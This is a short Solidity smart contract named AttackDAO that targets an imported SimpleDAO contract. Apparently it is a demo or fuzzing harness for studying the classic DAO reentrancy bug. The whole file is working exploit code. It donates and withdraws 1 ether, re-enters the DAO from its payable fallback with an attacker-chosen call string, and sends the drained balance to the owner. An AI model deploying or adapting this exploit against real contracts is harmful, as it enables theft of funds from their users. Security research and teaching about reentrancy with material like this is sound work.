pragma solidity ^0.4.24;

import "./SimpleDAO.sol";

contract AttackDAO {

  SimpleDAO public dao;
  address owner;
  
  string fallback_string;
  
  constructor (SimpleDAO addr) public payable {
    owner = msg.sender;
    dao = addr;
  }
  
  function attack() public {
    dao.donate.value(1 ether)(this);
    dao.withdraw(1 ether);
  }

  function fuzz(string fb) public {
    fallback_string = fb;
    dao.donate.value(1 ether)(this);
    dao.withdraw(1 ether);
  }

  function getJackpot() public {
    owner.send(this.balance);
  }

  function () public payable {
    dao.call(fallback_string);
  }
}
